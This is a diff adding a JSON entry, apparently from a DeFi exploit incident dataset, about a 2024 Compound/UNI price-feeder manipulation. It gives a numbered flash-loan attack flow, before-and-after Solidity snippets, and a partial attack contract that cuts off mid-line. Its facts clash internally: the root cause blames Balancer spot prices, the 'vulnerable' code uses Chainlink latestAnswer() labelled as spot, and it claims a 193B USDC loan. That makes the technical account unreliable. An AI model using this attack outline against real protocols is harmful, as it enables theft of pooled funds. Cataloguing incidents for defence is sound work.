@@ -1,0 +1,39 @@
+{
+ "id": "2024__2024-02-13_CompoundUni_PriceManipulation",
+ "source_file": "2024/2024-02-13_CompoundUni_PriceManipulation.md",
+ "title": "Compound/UNI — Price Feeder Manipulation via Incomplete Liquidation Analysis",
+ "date": "2024-02-13",
+ "protocol": "Compound",
+ "chain": "Ethereum",
+ "loss_raw": "~$439,537",
+ "loss_usd": 439537.0,
+ "root_cause": "Compound's UNI market price feeder referenced Balancer AMM spot prices, making it manipulable via large single-block swaps — excessive UNI borrowing followed by incomplete liquidation resulted in bad debt",
+ "attack_tx": null,
+ "vulnerable_contract": "Price Feeder 0x50ce56A3",
+ "classes": [
+  "oracle-price-manipulation"
+ ],
+ "code_before": [
+  "❌ Vulnerable code: spot price-based price feeder\nfunction getUnderlyingPrice(CToken cToken) external view returns (uint256) {\n    // Uniswap/Chainlink spot price — manipulable via large flash loans\n    return priceFeed.latestAnswer() * 1e10; // 8 decimals → 18 decimals\n}\n\n//",
+  "// File: UniswapAnchoredView.sol\n    function price(string calldata symbol) external view returns (uint256) {  // ❌ Vulnerability\n        TokenConfig memory config = getTokenConfigBySymbol(symbol);\n        return priceInternal(config);\n    }"
+ ],
+ "code_after": [
+  "✅ Safe code: Chainlink + TWAP dual validation\nfunction getUnderlyingPrice(CToken cToken) external view returns (uint256) {\n    uint256 chainlinkPrice = getChainlinkPrice(cToken);\n    uint256 twapPrice = getTWAPPrice(cToken, 1800);\n    // Revert if deviation between the two prices exceeds 5%\n    require(\n        abs(chainlinkPrice - twapPrice) * 100 / chainlinkPrice <= 5,\n        \"price deviation too high\"\n    );\n    return chainlinkPrice;\n}"
+ ],
+ "steps": [
+  "→ [1] Balancer flash: 193B USDC flash loan",
+  "→ [2] USDC → cUSDC mint (Compound collateral deposit)",
+  "→ [3] Compound markets enterMarkets",
+  "→ [4] getAccountLiquidity() query",
+  "→ [5] Price feeder getUnderlyingPrice() call (manipulated price)",
+  "→ [6] Maximum UNI borrow",
+  "→ [7] UNI → WETH (Uniswap V3)",
+  "→ WETH → USDC (Uniswap V3)",
+  "→ [8] Flash loan repayment",
+  "→ [9] ~$439K profit + Compound bad debt created"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─→ [1] Balancer flash: 193B USDC flash loan\n  │\n  ├─→ [2] USDC → cUSDC mint (Compound collateral deposit)\n  │\n  ├─→ [3] Compound markets enterMarkets\n  │\n  ├─→ [4] getAccountLiquidity() query\n  │\n  ├─→ [5] Price feeder getUnderlyingPrice() call (manipulated price)\n  │\n  ├─→ [6] Maximum UNI borrow\n  │\n  ├─→ [7] UNI → WETH (Uniswap V3)\n  │   └─→ WETH → USDC (Uniswap V3)\n  │\n  ├─→ [8] Flash loan repayment\n  │\n  └─→ [9] ~$439K profit + Compound bad debt created",
+  "interface ICompound {\n    function mint(uint256 mintAmount) external returns (uint256);\n    function enterMarkets(address[] calldata cTokens) external returns (uint256[] memory);\n    function getAccountLiquidity(address account) external view returns (uint256, uint256, uint256);\n    function getUnderlyingPrice(address cToken) external view returns (uint256);\n    function borrow(uint256 borrowAmount) external returns (uint256);\n}\n\ncontract AttackContract {\n    ICompound constant cUSDC = ICompound(0x39AA39c021dfbaE8faC545936693aC917d5E7563);\n\n    function receiveFlashLoan(\n        IERC20[] memory, uint256[] memory amounts,\n        uint256[] memory, bytes memory\n    ) external {\n        // [1] 193B USDC → cUSDC mint\n        USDC.approve(address(cUSDC), amounts[0]);\n        cUSDC.mint(amounts["
+ ]
+}
